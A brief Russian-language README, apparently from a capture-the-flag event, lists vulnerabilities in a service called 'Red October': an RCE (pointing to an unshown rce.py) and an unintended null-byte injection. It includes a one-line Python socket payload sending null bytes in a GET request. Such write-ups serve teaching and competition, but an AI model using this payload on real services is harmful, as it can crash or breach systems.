# Уязвимости сервиса красный октябрь

- RCE 

смотрите rce.py

- внедрение NULL Byte в GET (авторское анинтендет решение от [@Galagoshin](https://github.com/Galagoshin))

```python
s.sendall(b'/GET \x00\x00')
